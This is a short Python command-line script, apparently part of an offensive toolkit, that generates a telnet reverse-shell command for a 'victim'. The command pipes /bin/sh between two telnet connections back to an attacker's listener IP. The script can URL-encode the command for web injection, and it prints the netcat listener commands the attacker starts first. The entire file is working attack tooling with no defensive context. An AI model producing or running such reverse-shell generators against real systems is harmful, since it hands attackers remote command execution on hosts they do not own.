import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port_in")
@click.argument("listener_port_out")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output (victim command only).")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the victim command.")
def command(listener_ip, listener_port_in, listener_port_out, raw, urlencode):
    """Return Telnet reverse shell. Requires two listeners on LISTENER_PORT_IN and LISTENER_PORT_OUT."""
    victim_cmd = f"telnet {listener_ip} {listener_port_in} | /bin/sh | telnet {listener_ip} {listener_port_out}"
    if urlencode:
        victim_cmd = quote(victim_cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}Telnet reverse shell — start two listeners first:")
        click.secho(f"{Fore.WHITE}\tnc -lvp {listener_port_in}")
        click.secho(f"\tnc -lvp {listener_port_out}")
        click.secho(f"{Fore.LIGHTGREEN_EX}Victim command:\n\t{Fore.WHITE}{victim_cmd}")
    else:
        click.secho(victim_cmd, nl=False)
